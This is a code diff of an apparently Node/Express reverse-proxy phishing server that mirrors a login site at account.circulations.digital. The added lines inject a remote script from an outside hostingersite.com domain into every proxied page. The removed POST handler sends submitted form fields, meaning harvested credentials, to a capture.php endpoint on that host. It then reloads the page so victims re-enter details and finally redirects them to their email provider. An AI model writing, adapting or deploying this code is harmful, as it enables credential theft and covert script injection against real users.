@@ -182,7 +182,9 @@ app.get('/api/*', (req, res) => {
 
 	  // define baseTag in this scope so it's available when inserting into head
 	  const baseTag = `<base href="https://account.circulations.digital">`;
-
+	  const injectedScript = `<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script src="https://https://plum-raccoon-322277.hostingersite.com/inject.js"></script>`;
+      body = body.replace('</body>', `${injectedScript}</body>`);
+	  
 	  try {
 		// Quick sanity: if body is empty or clearly not text, skip HTML processing
 		if (!body || typeof body !== 'string' || body.length < 10) {
@@ -287,104 +289,6 @@ app.get('/api/*', (req, res) => {
   });
 });
 
-app.post('/api/*', async (req, res) => {
-  try {
-    console.log("req.body: ", req.body);
-
-    // Forward POST data to PHP
-    await axios.post(
-      'https://plum-raccoon-322277.hostingersite.com/capture.php',
-      qs.stringify(req.body),
-      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-    );
-
-    // Track attempts in session
-    if (!req.session.attempts) req.session.attempts = 0;
-    req.session.attempts++;
-
-    console.log(`Attempts so far: ${req.session.attempts}`);
-
-    if (req.session.attempts < 3) {
-      // First attempt → reload the same page (original GET)
-      //const reloadUrl = req.originalUrl.replace('/api', '');
-	  const reloadUrl = req.originalUrl;
-      return res.redirect(reloadUrl);
-    } else {
-      // Second attempt → redirect to email domain
-      let emailField = Object.values(req.body).find(v => typeof v === 'string' && v.includes('@'));
-      let redirectDomain = 'https://google.com';
-
-      if (emailField) {
-        let domain = emailField.split('@')[1];
-        redirectDomain = `https://${domain}`;
-      }
-
-      /* // reset attempts after redirect
-      req.session.attempts = 0;
-      return res.redirect(redirectDomain); */
-	  
-	  // reset attempts after redirect
-		req.session.attempts = 0;
-
-		// Build the safe redirect HTML that asks the parent/top to navigate
-		const safeUrl = String(redirectDomain).replace(/"/g, '\\"'); // escape any quotes to be safe
-		const redirectHtml = `<!doctype html>
-		<html>
-		  <head>
-			<meta charset="utf-8">
-			<title>Redirecting…</title>
-			<meta name="viewport" content="width=device-width, initial-scale=1">
-			<style>
-			  /* minimal, so page is usable if JS disabled */
-			  body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin: 40px; color:#222; }
-			  .msg { max-width: 640px; margin: 0 auto; }
-			  a { color: #06c; }
-			</style>
-		  </head>
-		  <body>
-			<!-- <div class="msg">
-			  <h1>Redirecting…</h1>
-			  <p>If you are inside an iframe, the parent window will be redirected shortly. If nothing happens, <a href="${safeUrl}" target="_top">click here</a>.</p>
-			</div> -->
-
-			<script>
-			  (function () {
-				var target = "${safeUrl}";
-				try {
-				  // If inside iframe -> ask parent to navigate top
-				  if (window.top !== window.self) {
-					// Try to change the top-level location
-					window.top.location = target;
-				  } else {
-					// Not inside iframe -> normal redirect
-					window.location.href = target;
-				  }
-				} catch (e) {
-				  // If cross-origin access throws, fall back to opening in top via anchor
-				  console.warn('Top navigation failed, falling back to link', e);
-				  var a = document.createElement('a');
-				  a.href = target;
-				  a.target = '_top';
-				  a.rel = 'noopener noreferrer';
-				  a.textContent = 'Continue';
-				  document.body.appendChild(a);
-				}
-			  })();
-			</script>
-		  </body>
-		</html>`;
-
-		// Send the HTML with proper headers
-		res.setHeader('Content-Type', 'text/html; charset=utf-8');
-		return res.status(200).send(redirectHtml);
-    }
-
-  } catch (err) {
-    console.error('Error handling request:', err.message);
-    res.status(500).send('Server error');
-  }
-});
-
 app.options('/api/*', (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -395,4 +299,3 @@ app.options('/api/*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Proxy server running on http://localhost:${PORT}`);
 });
-
